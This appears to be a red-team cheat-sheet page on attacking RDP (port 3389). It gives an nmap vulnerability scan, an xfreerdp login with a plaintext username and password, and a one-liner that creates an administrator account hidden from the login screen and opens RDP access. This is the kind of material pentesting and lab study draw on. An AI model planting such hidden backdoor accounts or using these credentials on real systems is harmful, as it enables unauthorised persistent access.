---
title: 3389 RDP
parent: Services
grand_parent: Red Team
nav_order: 3389
---
# RDP
## Remote Desktop Protocol

---

## Default Port

- 3389

---

## Service Info



---
## Common security issues



---

## 1. Initial Scan

```bash
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 192.168.133.159
```
- --script An option to execute a specified Nmap script. In this case, we are using three RDP-related scripts.
- rdp-enum-encryption: A script that enumerates the encryption methods used for RDP connections to assess security strength.
- rdp-vuln-ms12-020: A script that checks for the Microsoft RDP vulnerability (MS12-020). This vulnerability allows a remote attacker to crash the RDP service.

👉 Check:
### Expected Output
- The rdp-enum-encryption script reports the type of encryption and security level used for RDP connections.
- The `rdp-vuln-ms12-020` script checks whether the target system is vulnerable to the MS12-020 vulnerability.
- The `rdp-ntlm-info` script retrieves the NTLM version and other authentication-related information.

By combining these scripts, you can comprehensively assess the security status of the RDP service and determine whether any vulnerabilities exist.

---

## 2. Connect

👉 Usually limited without credentials

```zsh
xfreerdp3 /u:Eric.Wallows /p:EricLikesRunning800 /v:192.168.121.95 /dynamic-resolution
```

---

## 3. Enable-RDP-OneLiner

### Repository
https://github.com/crazywifi/Enable-RDP-One-Liner-CMD

```powershell
net user /add (Username) (Password) && net localgroup administrators (Username) /add & net localgroup "Remote Desktop Users" (Username) /add & netsh advfirewall firewall set rule group="remote desktop" new enable=Yes & reg add HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v (Username) /t REG_DWORD /d 0 & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v TSEnabled /t REG_DWORD /d 1 /f & sc config TermService start= auto
```

# Explain
```powershell
# Adding User: 
net user /add (Username) (Password)

# Adding User in Administrator Group:
net localgroup administrators (Username) /add

# Adding user in Remote Desktop Users:
net localgroup "Remote Desktop Users" (Username) /add

# Opening Port in Local Firewall:
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# Hiding User from Window Login Screen:
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v (Username) /t REG_DWORD /d 0

# Setting Terminal Service in Startup Mode:
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v TSEnabled /t REG_DWORD /d 1 /f

# Setting Terminal Service in Auto Mode:
sc config TermService start= auto
```
---

👉 If shell obtained:

→ [Windows Privilege Escalation](../04_privesc/windows.md)
